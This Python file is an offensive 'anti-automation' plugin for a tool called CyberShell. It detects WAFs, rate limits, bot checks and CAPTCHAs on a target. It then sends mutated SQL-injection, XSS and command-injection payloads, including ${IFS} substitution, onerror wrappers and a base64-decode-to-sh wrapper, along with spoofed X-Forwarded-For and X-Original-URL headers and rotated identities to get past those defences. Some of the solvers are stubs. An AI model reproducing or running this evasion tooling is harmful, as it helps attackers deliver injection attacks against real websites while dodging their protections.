"""
Anti-Automation Plugin for CyberShell
Bypasses WAF, rate limiting, and anti-bot mechanisms
"""

import time
import random
import base64
import json
import hashlib
from typing import Dict, Any, List, Optional
import requests
from urllib.parse import quote, unquote, urlparse
import string
import re
from user_agents import parse

class AntiAutomationPlugin:
    """
    Sophisticated evasion techniques for WAF and anti-bot systems
    """
    
    def __init__(self):
        self.user_agents = self.load_user_agents()
        self.encoding_techniques = [
            self.url_encode,
            self.double_url_encode,
            self.unicode_encode,
            self.html_entity_encode,
            self.base64_encode,
            self.hex_encode,
            self.mixed_case,
            self.comment_injection
        ]
        self.waf_bypass_headers = self.load_bypass_headers()
        self.rate_limit_delays = {}
        self.proxy_pool = []
        self.fingerprint_data = {}
        
    def run(self, **kwargs) -> Dict[str, Any]:
        """
        Main entry point for anti-automation bypass
        """
        action = kwargs.get('action', 'bypass')
        target = kwargs.get('target', '')
        payload = kwargs.get('payload', '')
        method = kwargs.get('method', 'GET')
        
        if action == 'bypass':
            return self.bypass_protection(target, payload, method)
        elif action == 'detect':
            return self.detect_protection(target)
        elif action == 'evade_waf':
            return self.evade_waf(target, payload)
        elif action == 'rotate_identity':
            return self.rotate_identity()
        elif action == 'solve_challenge':
            return self.solve_challenge(target, kwargs.get('challenge_type'))
            
    def detect_protection(self, target: str) -> Dict[str, Any]:
        """
        Detect what protection mechanisms are in place
        """
        protections = []
        
        # Test for WAF
        waf_result = self.detect_waf(target)
        if waf_result['detected']:
            protections.append(f"WAF: {waf_result['type']}")
            
        # Test for rate limiting
        if self.detect_rate_limiting(target):
            protections.append("Rate Limiting")
            
        # Test for bot detection
        bot_detection = self.detect_bot_protection(target)
        if bot_detection['detected']:
            protections.append(f"Bot Detection: {bot_detection['type']}")
            
        # Test for CAPTCHA
        if self.detect_captcha(target):
            protections.append("CAPTCHA")
            
        return {
            'protections': protections,
            'recommendations': self.get_bypass_recommendations(protections)
        }
        
    def detect_waf(self, target: str) -> Dict[str, Any]:
        """
        Detect WAF presence and type
        """
        waf_signatures = {
            'Cloudflare': ['cf-ray', 'cloudflare', '__cfduid', 'cf-cache-status'],
            'AWS WAF': ['x-amzn-requestid', 'x-amzn-trace-id', 'x-amz-cf-id'],
            'Akamai': ['akamai', 'akamai-cache-status', 'akamai-request-id'],
            'Incapsula': ['incap_ses', 'visid_incap', 'incapsula'],
            'ModSecurity': ['mod_security', 'modsecurity', 'owasp'],
            'Barracuda': ['barra', 'barracuda'],
            'F5 BIG-IP': ['x-waf-status', 'f5-bigip', 'bigip'],
            'Sucuri': ['sucuri', 'x-sucuri-id', 'x-sucuri-cache'],
            'Fortinet': ['fortigate', 'fortiweb'],
            'Imperva': ['x-iinfo', 'imperva']
        }
        
        # Send test request with attack pattern
        test_payload = "' OR '1'='1"
        
        try:
            response = requests.get(
                f"{target}?test={test_payload}",
                headers={'User-Agent': random.choice(self.user_agents)},
                timeout=5
            )
            
            headers_text = str(response.headers).lower()
            body_text = response.text.lower()
            
            for waf_name, signatures in waf_signatures.items():
                for sig in signatures:
                    if sig.lower() in headers_text or sig.lower() in body_text:
                        return {'detected': True, 'type': waf_name}
                        
            # Generic WAF detection
            if response.status_code in [403, 406, 419, 429, 503]:
                if any(word in body_text for word in ['blocked', 'denied', 'detected', 'forbidden']):
                    return {'detected': True, 'type': 'Generic'}
                    
        except:
            pass
            
        return {'detected': False, 'type': None}
        
    def detect_rate_limiting(self, target: str) -> bool:
        """
        Detect rate limiting
        """
        try:
            # Send rapid requests
            for _ in range(20):
                response = requests.get(target, timeout=2)
                if response.status_code == 429:
                    return True
                time.sleep(0.1)
        except:
            pass
        return False
        
    def detect_bot_protection(self, target: str) -> Dict[str, Any]:
        """
        Detect bot protection mechanisms
        """
        try:
            # Test without user agent
            response = requests.get(target, headers={}, timeout=5)
            if response.status_code == 403:
                return {'detected': True, 'type': 'User-Agent Required'}
                
            # Test with bot user agent
            bot_ua = 'Bot/1.0'
            response = requests.get(target, headers={'User-Agent': bot_ua}, timeout=5)
            if response.status_code == 403:
                return {'detected': True, 'type': 'Bot User-Agent Blocked'}
                
            # Check for JavaScript challenges
            if 'challenge-platform' in response.text or 'jschl' in response.text:
                return {'detected': True, 'type': 'JavaScript Challenge'}
                
            # Check for fingerprinting
            if 'fingerprint' in response.text or 'fp-' in response.text:
                return {'detected': True, 'type': 'Browser Fingerprinting'}
                
        except:
            pass
            
        return {'detected': False, 'type': None}
        
    def detect_captcha(self, target: str) -> bool:
        """
        Detect CAPTCHA presence
        """
        captcha_indicators = [
            'recaptcha', 'g-recaptcha', 'h-captcha', 'hcaptcha',
            'captcha', 'security-check', 'challenge-form'
        ]
        
        try:
            response = requests.get(target, timeout=5)
            content = response.text.lower()
            
            for indicator in captcha_indicators:
                if indicator in content:
                    return True
        except:
            pass
            
        return False
        
    def bypass_protection(self, target: str, payload: str, method: str) -> Dict[str, Any]:
        """
        Apply various bypass techniques
        """
        results = []
        
        # Try different encoding techniques
        for encode_func in self.encoding_techniques:
            encoded_payload = encode_func(payload)
            result = self.send_bypassed_request(target, encoded_payload, method)
            
            if result['success']:
                return {
                    'success': True,
                    'technique': encode_func.__name__,
                    'payload': encoded_payload,
                    'response': result['response']
                }
            results.append(result)
            
        # Try header manipulation
        header_result = self.bypass_with_headers(target, payload, method)
        if header_result['success']:
            return header_result
            
        # Try request fragmentation
        fragment_result = self.fragment_request(target, payload, method)
        if fragment_result['success']:
            return fragment_result
            
        return {
            'success': False,
            'attempts': results,
            'message': 'All bypass techniques failed'
        }
        
    def evade_waf(self, target: str, payload: str) -> Dict[str, Any]:
        """
        Specific WAF evasion techniques
        """
        evasion_payloads = []
        
        # SQL Injection evasions
        if 'select' in payload.lower() or 'union' in payload.lower():
            evasion_payloads.extend([
                payload.replace(' ', '/**/'),
                payload.replace('SELECT', 'SeLeCt'),
                payload.replace('UNION', 'UNI%4fN'),
                payload.replace('=', ' LiKe '),
                f"/*!50000{payload}*/",
                payload.replace(' ', '%20'),
                payload.replace(' ', '+'),
                self.chunk_payload(payload)
            ])
            
        # XSS evasions
        if '<script' in payload.lower() or 'javascript' in payload.lower():
            evasion_payloads.extend([
                payload.replace('<', '%3C').replace('>', '%3E'),
                payload.replace('script', 'scr%69pt'),
                f"<svg onload={payload}>",
                f"<img src=x onerror={payload}>",
                self.obfuscate_javascript(payload),
                self.unicode_escape_xss(payload)
            ])
            
        # Command injection evasions
        if any(char in payload for char in ['|', ';', '&', '$', '`']):
            evasion_payloads.extend([
                payload.replace(' ', '${IFS}'),
                payload.replace(';', '%3B'),
                payload.replace('|', '%7C'),
                f"$'{payload}'",
                self.base64_command(payload)
            ])
            
        # Test each evasion
        for evaded_payload in evasion_payloads:
            try:
                response = requests.get(
                    f"{target}?input={evaded_payload}",
                    headers=self.get_evasion_headers(),
                    timeout=5
                )
                
                if response.status_code == 200:
                    return {
                        'success': True,
                        'payload': evaded_payload,
                        'response': response.text
                    }
            except:
                continue
                
        return {'success': False, 'message': 'WAF evasion failed'}
        
    def send_bypassed_request(self, target: str, payload: str, method: str) -> Dict[str, Any]:
        """
        Send request with bypass techniques applied
        """
        headers = self.get_evasion_headers()
        
        # Add delay to avoid rate limiting
        self.apply_rate_limit_delay(target)
        
        try:
            if method.upper() == 'GET':
                response = requests.get(
                    f"{target}?input={payload}",
                    headers=headers,
                    timeout=10
                )
            else:
                response = requests.post(
                    target,
                    data={'input': payload},
                    headers=headers,
                    timeout=10
                )
                
            if response.status_code == 200:
                return {
                    'success': True,
                    'response': response.text,
                    'status_code': response.status_code
                }
        except Exception as e:
            pass
            
        return {'success': False}
        
    def get_evasion_headers(self) -> Dict[str, str]:
        """
        Get headers for evasion
        """
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        
        # Add bypass headers
        bypass_headers = random.choice(self.waf_bypass_headers)
        headers.update(bypass_headers)
        
        return headers
        
    def apply_rate_limit_delay(self, target: str):
        """
        Apply appropriate delay to avoid rate limiting
        """
        domain = urlparse(target).netloc
        
        if domain in self.rate_limit_delays:
            delay = self.rate_limit_delays[domain]
        else:
            delay = random.uniform(0.5, 2.0)
            
        time.sleep(delay)
        
    def rotate_identity(self) -> Dict[str, Any]:
        """
        Rotate identity to appear as different user
        """
        new_identity = {
            'user_agent': random.choice(self.user_agents),
            'ip': self.get_new_proxy(),
            'session_id': self.generate_session_id(),
            'fingerprint': self.generate_fingerprint()
        }
        
        return {
            'success': True,
            'new_identity': new_identity
        }
        
    def solve_challenge(self, target: str, challenge_type: str) -> Dict[str, Any]:
        """
        Solve various challenge types
        """
        if challenge_type == 'javascript':
            return self.solve_js_challenge(target)
        elif challenge_type == 'captcha':
            return self.solve_captcha(target)
        elif challenge_type == 'proof_of_work':
            return self.solve_pow_challenge(target)
        else:
            return {'success': False, 'message': 'Unknown challenge type'}
            
    # Encoding functions
    def url_encode(self, payload: str) -> str:
        return quote(payload)
        
    def double_url_encode(self, payload: str) -> str:
        return quote(quote(payload))
        
    def unicode_encode(self, payload: str) -> str:
        return ''.join([f'\\u{ord(c):04x}' for c in payload])
        
    def html_entity_encode(self, payload: str) -> str:
        return ''.join([f'&#{ord(c)};' for c in payload])
        
    def base64_encode(self, payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()
        
    def hex_encode(self, payload: str) -> str:
        return ''.join([f'%{ord(c):02x}' for c in payload])
        
    def mixed_case(self, payload: str) -> str:
        return ''.join([c.upper() if random.random() > 0.5 else c.lower() for c in payload])
        
    def comment_injection(self, payload: str) -> str:
        parts = payload.split(' ')
        return '/**/'.join(parts)
        
    def chunk_payload(self, payload: str) -> str:
        """
        Chunk payload to bypass length restrictions
        """
        chunks = [payload[i:i+10] for i in range(0, len(payload), 10)]
        return '+'.join([f"'{chunk}'" for chunk in chunks])
        
    def obfuscate_javascript(self, payload: str) -> str:
        """
        Obfuscate JavaScript payload
        """
        # Simple obfuscation
        obfuscated = payload.replace('alert', 'window["al"+"ert"]')
        obfuscated = obfuscated.replace('document', 'window["doc"+"ument"]')
        return obfuscated
        
    def unicode_escape_xss(self, payload: str) -> str:
        """
        Unicode escape for XSS
        """
        return payload.replace('<', '\\x3c').replace('>', '\\x3e')
        
    def base64_command(self, command: str) -> str:
        """
        Base64 encode command for execution
        """
        b64 = base64.b64encode(command.encode()).decode()
        return f"echo {b64} | base64 -d | sh"
        
    def fragment_request(self, target: str, payload: str, method: str) -> Dict[str, Any]:
        """
        Fragment request to bypass inspection
        """
        # Split payload into chunks
        chunks = [payload[i:i+5] for i in range(0, len(payload), 5)]
        
        # Send fragmented request
        # This would require low-level socket programming
        # Placeholder implementation
        return {'success': False, 'message': 'Fragmentation not implemented'}
        
    def bypass_with_headers(self, target: str, payload: str, method: str) -> Dict[str, Any]:
        """
        Bypass using header manipulation
        """
        header_sets = [
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Forwarded-Host': 'localhost'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-Original-URL': target},
            {'X-Rewrite-URL': target}
        ]
        
        for headers in header_sets:
            headers.update(self.get_evasion_headers())
            
            try:
                if method.upper() == 'GET':
                    response = requests.get(
                        f"{target}?input={payload}",
                        headers=headers,
                        timeout=5
                    )
                else:
                    response = requests.post(
                        target,
                        data={'input': payload},
                        headers=headers,
                        timeout=5
                    )
                    
                if response.status_code == 200:
                    return {
                        'success': True,
                        'headers_used': headers,
                        'response': response.text
                    }
            except:
                continue
                
        return {'success': False}
        
    def load_user_agents(self) -> List[str]:
        """
        Load realistic user agent strings
        """
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
        ]
        
    def load_bypass_headers(self) -> List[Dict[str, str]]:
        """
        Load WAF bypass header combinations
        """
        return [
            {'X-Originating-IP': '127.0.0.1', 'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1', 'X-Forwarded-Host': 'localhost'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {}
        ]
        
    def get_new_proxy(self) -> str:
        """
        Get a new proxy from pool
        """
        if self.proxy_pool:
            return random.choice(self.proxy_pool)
        return None
        
    def generate_session_id(self) -> str:
        """
        Generate realistic session ID
        """
        return ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        
    def generate_fingerprint(self) -> Dict[str, Any]:
        """
        Generate browser fingerprint
        """
        return {
            'screen': '1920x1080',
            'timezone': 'UTC-5',
            'language': 'en-US',
            'platform': 'Win32',
            'plugins': ['Chrome PDF Plugin', 'Native Client'],
            'canvas': hashlib.md5(str(random.random()).encode()).hexdigest()
        }
        
    def solve_js_challenge(self, target: str) -> Dict[str, Any]:
        """
        Solve JavaScript challenge
        """
        # This would require executing JavaScript
        # Could use Selenium or Playwright
        return {'success': False, 'message': 'JS challenge solver not implemented'}
        
    def solve_captcha(self, target: str) -> Dict[str, Any]:
        """
        Solve CAPTCHA challenge
        """
        # Would require CAPTCHA solving service integration
        return {'success': False, 'message': 'CAPTCHA solver not implemented'}
        
    def solve_pow_challenge(self, target: str) -> Dict[str, Any]:
        """
        Solve Proof of Work challenge
        """
        # Would require computing proof of work
        return {'success': False, 'message': 'PoW solver not implemented'}
        
    def get_bypass_recommendations(self, protections: List[str]) -> List[str]:
        """
        Get recommendations based on detected protections
        """
        recommendations = []
        
        if 'WAF' in str(protections):
            recommendations.append('Use encoding techniques and header manipulation')
        if 'Rate Limiting' in protections:
            recommendations.append('Implement request delays and proxy rotation')
        if 'Bot Detection' in str(protections):
            recommendations.append('Use browser automation with realistic behavior')
        if 'CAPTCHA' in protections:
            recommendations.append('Integrate CAPTCHA solving service or use session persistence')
            
        return recommendations
